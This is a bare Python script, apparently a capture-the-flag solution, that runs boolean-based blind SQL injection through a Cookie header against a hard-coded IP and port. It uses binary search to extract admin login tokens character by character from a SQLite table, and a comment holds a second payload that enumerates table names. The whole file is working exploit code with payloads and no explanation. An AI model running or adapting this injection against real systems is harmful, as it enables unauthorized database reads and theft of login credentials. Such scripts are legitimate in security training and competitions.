import requests

url = 'http://128.199.157.172:28337/flag'

# token=9Utongvpml4hI84sG8aLYFm5UTryfHEM' or unicode(substr((select group_concat(name) from sqlite_master where type='table'),1,1))=100 or '1'='0
def get_name():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            
            payload = f"token=9Utongvpml4hI84sG8aLYFm5UTryfHEM' or unicode(substr((select group_concat(token) from nopass_login_account where is_admin=1),{i},1))>{mid} or '1'='0"
            
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
                'Cookie': payload
            }

            # print(headers)
            r = requests.get(url=url, headers=headers)
            # print(r.text)
            
                
                
            if 'Error: Permission Denied' in r.text:
                high = mid
            else:
                low = mid + 1
                
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
get_name()